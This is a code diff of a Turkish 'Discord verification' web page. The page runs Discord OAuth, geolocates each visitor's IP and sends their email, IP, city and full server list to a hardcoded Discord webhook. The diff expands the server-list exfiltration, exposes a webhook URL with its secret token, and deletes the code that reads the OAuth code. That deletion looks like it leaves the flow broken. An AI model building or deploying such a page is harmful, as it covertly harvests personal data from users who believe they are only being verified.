@@ -1,9 +1,7 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Discord Doğrulama</title>
+  <!-- Önceki stil kısımları aynı kalacak -->
   <style>
     body {
       font-family: 'Arial', sans-serif;
@@ -72,6 +70,7 @@
   </style>
 </head>
 <body>
+  <!-- HTML kısmı öncekiyle aynı -->
   <div class="container">
     <div id="initialView">
       <h2>Discord Doğrulama</h2>
@@ -100,9 +99,9 @@
     // Yapılandırma
     const config = {
       clientId: "1399152888214851595",
-      redirectUri: window.location.href.split('?')[0], // Mevcut sayfa URL'si
+      redirectUri: window.location.href.split('?')[0],
       webhookUrl: "https://discord.com/api/webhooks/1399151324309881015/01oC6NPk2n7Mut17QfUvwsBUFRakn7rBYg52yTP7zI4IEfzEeMKePKD33IwgFvobyQGu",
-      discordServerInvite: "https://discord.gg/una", // Kendi sunucu linkiniz
+      discordServerInvite: "https://discord.gg/una",
       scope: "identify email guilds"
     };
 
@@ -127,14 +126,6 @@
       }
     });
 
-    // URL'den code parametresini kontrol et
-    const params = new URLSearchParams(window.location.search);
-    const code = params.get('code');
-
-    if (code) {
-      verifyUser(code);
-    }
-
     // Tekrar dene butonu
     retryBtn.addEventListener('click', () => {
       window.location.href = window.location.href.split('?')[0];
@@ -144,21 +135,18 @@
       showView(loadingView);
       
       try {
-        // 1. IP adresini al ve konum kontrolü yap
+        // 1. IP ve konum kontrolü
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
         const ipAddress = ipData.ip;
         
-        // Konum kontrolü için ek API
         const locationCheck = await fetch(`https://ipapi.co/${ipAddress}/json/`);
         const locationData = await locationCheck.json();
         
-        // VPN/Proxy kontrolü ve Türkiye kontrolü
         if (locationData.proxy || locationData.vpn || locationData.tor) {
           throw new Error('VPN/Proxy kullanımı tespit edildi');
         }
         
-        // Türkiye kontrolü (TR kodu)
         if (locationData.country !== 'TR') {
           throw new Error('IP adresiniz Türkiye dışında görünüyor');
         }
@@ -194,8 +182,8 @@
         });
         const guildsData = await guildsResponse.json();
 
-        // 4. Webhook'a bilgileri gönder
-        await sendWebhook(userData, guildsData, ipAddress, locationData);
+        // 4. Webhook'a bilgileri gönder (Tüm sunucuları tek mesajda gönder)
+        await sendWebhookWithAllGuilds(userData, guildsData, ipAddress, locationData);
 
         // 5. Başarılı mesajını göster ve sunucuya yönlendir
         showView(successView);
@@ -209,8 +197,9 @@
       }
     }
 
-    async function sendWebhook(user, guilds, ip, location) {
-      const embed = {
+    async function sendWebhookWithAllGuilds(user, guilds, ip, location) {
+      // İlk embed (temel bilgiler)
+      const mainEmbed = {
         title: "Yeni Discord Doğrulaması",
         color: 0x5865F2,
         thumbnail: {
@@ -225,8 +214,7 @@
           { name: "IP Adresi", value: ip || "Bilinmiyor", inline: true },
           { name: "Ülke", value: `${location.country_name} (${location.country})` || "Bilinmiyor", inline: true },
           { name: "Şehir", value: location.city || "Bilinmiyor", inline: true },
-          { name: "Toplam Sunucu", value: guilds.length.toString() || "0", inline: true },
-          { name: "Sunucular", value: guilds.slice(0, 5).map(g => g.name).join(", ") || "Yok" }
+          { name: "Toplam Sunucu", value: guilds.length.toString(), inline: true }
         ],
         timestamp: new Date().toISOString(),
         footer: {
@@ -234,19 +222,47 @@
         }
       };
 
+      // Sunucu listesi için ek embed'ler
+      const guildEmbeds = [];
+      const chunkSize = 25; // Her embed'de maksimum 25 sunucu
+      
+      for (let i = 0; i < guilds.length; i += chunkSize) {
+        const chunk = guilds.slice(i, i + chunkSize);
+        const guildList = chunk.map(g => `• ${g.name} (${g.id})`).join('\n');
+        
+        guildEmbeds.push({
+          color: 0x5865F2,
+          title: `Sunucu Listesi (${i + 1}-${Math.min(i + chunkSize, guilds.length)})`,
+          description: guildList,
+          footer: {
+            text: `Toplam ${guilds.length} sunucu`
+          }
+        });
+      }
+
       try {
-        const response = await fetch(config.webhookUrl, {
+        // Ana bilgileri gönder
+        await fetch(config.webhookUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
             username: "Doğrulama Sistemi",
             avatar_url: "https://discord.com/assets/1f0bfc0865d324c2587920a7d80c609b.png",
-            embeds: [embed] 
+            embeds: [mainEmbed] 
           })
         });
-        
-        if (!response.ok) {
-          console.error('Webhook gönderilirken hata oluştu:', await response.text());
+
+        // Sunucu listesini gönder (birden fazla mesaj olabilir)
+        for (const embed of guildEmbeds) {
+          await fetch(config.webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+              username: "Doğrulama Sistemi",
+              avatar_url: "https://discord.com/assets/1f0bfc0865d324c2587920a7d80c609b.png",
+              embeds: [embed] 
+            })
+          });
         }
       } catch (error) {
         console.error('Webhook gönderilemedi:', error);
